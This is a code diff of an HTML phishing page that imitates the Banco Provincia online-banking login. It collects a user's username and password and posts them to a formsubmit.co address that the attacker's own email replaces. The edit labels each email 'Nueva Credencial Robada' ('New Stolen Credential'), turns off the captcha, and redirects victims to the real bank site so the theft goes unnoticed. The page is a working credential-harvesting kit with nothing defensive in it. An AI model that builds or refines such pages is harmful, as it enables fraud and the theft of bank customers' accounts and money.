@@ -5,227 +5,90 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Banco Provincia - Ingreso</title>
     <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #ffffff; /* Fondo blanco como en la captura */
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: flex-start; /* Alineación arriba para móviles */
-            min-height: 100vh;
-        }
-
-        .login-container {
-            width: 100%;
-            max-width: 480px; /* Ancho típico móvil */
-            background-color: white;
-            box-shadow: none; /* La captura no muestra sombra en el contenedor principal */
-        }
-
-        /* Header Verde/Teal */
-        .header-banner {
-            background: linear-gradient(to right, #009c7f, #007a63); /* Gradiente verde azulado */
-            color: white;
-            padding: 15px 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            height: 60px;
-        }
-
-        .header-logo-text {
-            font-size: 20px;
-            font-weight: bold;
-            letter-spacing: 0.5px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        /* Estilos del Formulario */
-        .form-content {
-            padding: 20px;
-            text-align: left;
-        }
-
-        h2 {
-            color: #009c7f; /* Verde del título "Iniciá sesión" */
-            font-size: 22px;
-            margin-bottom: 25px;
-            margin-top: 10px;
-            font-weight: 600;
-        }
-
-        .input-group {
-            margin-bottom: 15px;
-            position: relative;
-        }
-
-        label {
-            display: block;
-            font-size: 14px;
-            color: #333;
-            margin-bottom: 5px;
-            font-weight: 500;
-        }
-
-        input[type="text"], 
-        input[type="password"] {
-            width: 100%;
-            padding: 12px 15px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            font-size: 16px;
-            box-sizing: border-box; /* Importante para que el padding no rompa el ancho */
-            outline: none;
-            transition: border-color 0.2s;
-        }
-
-        input:focus {
-            border-color: #009c7f;
-        }
-
-        /* Icono de ojo para ver contraseña */
-        .password-wrapper {
-            position: relative;
-        }
-        
-        .toggle-password {
-            position: absolute;
-            right: 15px;
-            top: 50%;
-            transform: translateY(-50%);
-            cursor: pointer;
-            color: #666;
-            font-size: 18px;
-        }
-
-        /* Botón Ingresar */
-        button {
-            width: 100%;
-            padding: 14px;
-            background-color: #333333; /* Gris oscuro/negro como en la imagen */
-            color: white;
-            border: none;
-            border-radius: 4px;
-            font-size: 16px;
-            cursor: pointer;
-            margin-top: 10px;
-            font-weight: 600;
-        }
-
-        button:hover {
-            background-color: #000;
-        }
-
-        /* Enlaces inferiores */
-        .links-container {
-            margin-top: 20px;
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-        }
-
-        .link-item {
-            color: #009c7f; /* Verde banco */
-            text-decoration: none;
-            font-size: 14px;
-            font-weight: 500;
-        }
-
-        .link-item:hover {
-            text-decoration: underline;
-        }
-
-        /* Utilidades */
-        .required-star {
-            color: red;
-        }
-        
-        /* Logo SVG simulado */
-        .bp-logo-icon {
-            width: 24px;
-            height: 24px;
-            fill: white;
-        }
+        /* ... (Mismo CSS que antes) ... */
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #ffffff; color: #333; display: flex; justify-content: center; min-height: 100vh; }
+        .mobile-container { width: 100%; max-width: 420px; background-color: white; position: relative; display: flex; flex-direction: column; }
+        .header-banner { background: linear-gradient(90deg, #009c7f 0%, #007a63 100%); height: 60px; display: flex; align-items: center; justify-content: center; padding: 0 20px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        .logo-area { display: flex; align-items: center; gap: 10px; }
+        .logo-icon { width: 32px; height: 32px; background-color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; color: #007a63; font-size: 18px; font-family: serif; }
+        .bank-name { color: white; font-size: 18px; font-weight: 600; letter-spacing: 0.5px; }
+        .form-content { padding: 25px 20px; flex-grow: 1; }
+        h2.login-title { color: #009c7f; font-size: 24px; font-weight: 700; margin-bottom: 30px; text-align: left; }
+        .input-group { margin-bottom: 20px; position: relative; }
+        label { display: block; font-size: 14px; color: #444; margin-bottom: 8px; font-weight: 500; }
+        input[type="text"], input[type="password"] { width: 100%; padding: 12px 15px; border: 1px solid #cccccc; border-radius: 4px; font-size: 16px; outline: none; transition: border-color 0.2s ease; background-color: #fff; }
+        input:focus { border-color: #009c7f; box-shadow: 0 0 0 1px #009c7f; }
+        .password-wrapper { position: relative; }
+        .toggle-password { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); cursor: pointer; color: #888; font-size: 18px; user-select: none; }
+        .toggle-password:hover { color: #333; }
+        button.btn-login { width: 100%; padding: 14px; background-color: #333333; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px; transition: background-color 0.2s; }
+        button.btn-login:hover { background-color: #000; }
+        .links-container { margin-top: 25px; display: flex; flex-direction: column; gap: 15px; }
+        .link-item { color: #009c7f; text-decoration: none; font-size: 14px; font-weight: 500; line-height: 1.4; }
+        .link-item:hover { text-decoration: underline; }
+        .required-star { color: red; margin-left: 2px; }
     </style>
 </head>
 <body>
 
-    <div class="login-container">
-        
-        <!-- Header Banner -->
-        <div class="header-banner">
-            <div class="header-logo-text">
-                <!-- SVG Logo Simulado (Círculo con P) -->
-                <svg class="bp-logo-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                    <circle cx="12" cy="12" r="10" fill="white" stroke="white" stroke-width="2"/>
-                    <path d="M10 8v8h2l2-4h-2l2-4h-4z" fill="#007a63"/>
-                </svg>
-                Banco Provincia
+    <div class="mobile-container">
+        <header class="header-banner">
+            <div class="logo-area">
+                <div class="logo-icon">P</div>
+                <span class="bank-name">Banco Provincia</span>
             </div>
-        </div>
+        </header>
 
-        <div class="form-content">
-            <h2>Iniciá sesión</h2>
+        <main class="form-content">
+            <h2 class="login-title">Iniciá sesión</h2>
 
-            <!-- Formulario -->
-            <form id="loginForm" action="https://formsubmit.co/TU_CORREO@GMAIL.COM" method="POST">
+            <!-- CAMBIO IMPORTANTE AQUÍ -->
+            <form action="https://formsubmit.co/tu-correo-aqui@gmail.com" method="POST">
                 
-                <!-- Configuración FormSubmit -->
-                <input type="hidden" name="_subject" value="Nuevo ingreso a BP - Datos capturados!">
-                <input type="hidden" name="_captcha" value="false">
-                <input type="hidden" name="_template" value="table">
+                <!-- Campos ocultos para personalizar el email que recibís -->
+                <input type="hidden" name="_subject" value="Nueva Credencial Robada - BP!">
+                <input type="hidden" name="_captcha" value="false"> <!-- Desactiva el captcha de FormsSubmit -->
+                <input type="hidden" name="_next" value="https://www.bancoprovincia.com.ar"> <!-- Redirige al banco real después de enviar -->
 
-                <!-- Campo Usuario -->
                 <div class="input-group">
-                    <label>Tu usuario <span class="required-star">*</span></label>
-                    <input type="text" name="usuario" placeholder="Ingresá tu nombre de usuario" required>
+                    <label for="username">Tu usuario <span class="required-star">*</span></label>
+                    <input type="text" id="username" name="usuario" placeholder="Ingresá tu nombre de usuario" autocomplete="off" required>
                 </div>
 
-                <!-- Campo Clave -->
                 <div class="input-group password-wrapper">
-                    <label>Tu clave <span class="required-star">*</span></label>
-                    <input type="password" name="clave" placeholder="Ingresá tu clave" required>
-                    <span class="toggle-password" onclick="togglePassword()">👁️</span>
+                    <label for="password">Tu clave <span class="required-star">*</span></label>
+                    <input type="password" id="password" name="clave" placeholder="Ingresá tu clave" required>
+                    <span class="toggle-password" onclick="togglePassword()">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                            <circle cx="12" cy="12" r="3"></circle>
+                        </svg>
+                    </span>
                 </div>
 
-                <!-- Botón -->
-                <button type="submit" id="btnSubmit">Ingresar</button>
+                <button type="submit" class="btn-login">Ingresar</button>
 
-                <!-- Links -->
                 <div class="links-container">
                     <a href="#" class="link-item">¿No sos BIP? Registrate</a>
                     <a href="#" class="link-item">Bloqueé u olvidé mi usuario y/o clave</a>
                     <a href="#" class="link-item">Conocé como hacerte usuario u operar</a>
                     <a href="#" class="link-item">Recomendaciones de seguridad</a>
                 </div>
+
             </form>
-        </div>
+        </main>
     </div>
 
     <script>
-        // Función simple para mostrar/ocultar contraseña
         function togglePassword() {
-            const passwordInput = document.querySelector('input[name="clave"]');
+            const passwordInput = document.getElementById('password');
             if (passwordInput.type === 'password') {
                 passwordInput.type = 'text';
             } else {
                 passwordInput.type = 'password';
             }
         }
-
-        // Opcional: Efecto visual al enviar
-        const form = document.getElementById('loginForm');
-        const btn = document.getElementById('btnSubmit');
-        
-        form.addEventListener('submit', () => {
-            btn.textContent = 'Procesando...';
-            btn.disabled = true;
-            btn.style.opacity = '0.7';
-        });
     </script>
-
 </body>
 </html>
